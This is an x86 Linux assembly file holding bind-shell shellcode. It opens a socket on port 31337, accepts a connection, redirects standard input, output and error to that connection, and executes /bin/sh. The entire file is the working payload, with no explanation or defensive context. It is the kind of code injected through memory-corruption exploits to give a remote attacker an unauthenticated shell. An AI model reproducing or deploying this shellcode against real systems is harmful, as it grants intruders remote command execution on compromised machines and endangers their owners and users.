section .text

global _start
_start:
	;int socket(2, 1, 0)
	push BYTE 0x66
	pop eax
	cdq
	inc ebx
	push edx
	push BYTE 0x1
	push BYTE 0x2
	mov ecx, esp
	int 0X80

	mov esi, eax


	;bind(s, [2, 31337, 0], 16)
	push BYTE 0x66
	pop eax
	inc ebx
	push edx
	push WORD 0x697a
	push WORD bx
	mov ecx, esp
	push BYTE 16
	push ecx
	push esi
	mov ecx, esp
	int 0x80


	;listen(s, 0)
	push BYTE 0x66
	pop eax
	cdq
	inc ebx
	inc ebx
	push edx
	push esi
	mov ecx, esp
	int 0x80

	;c = accept(s, 0, 0)
	push BYTE 0x66
	pop eax
	cdq
	inc ebx
	push edx
	push edx
	push esi
	mov ecx, esp
	int 0X80

	;dup2(s, 0)
	xchg eax, ebx
	push BYTE 0x2
	pop ecx
	dup_loop:
	 mov BYTE al, 0x3F
	 int 0x80
	 dec ecx
	 jns dup_loop

	;execve("/bin/sh\x00", ["/bin/sh", "\x00"], "\x00")
	push BYTE 0xb
	pop eax
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push edx
	mov ecx, esp
push ebx
mov ecx, esp
int 0x80
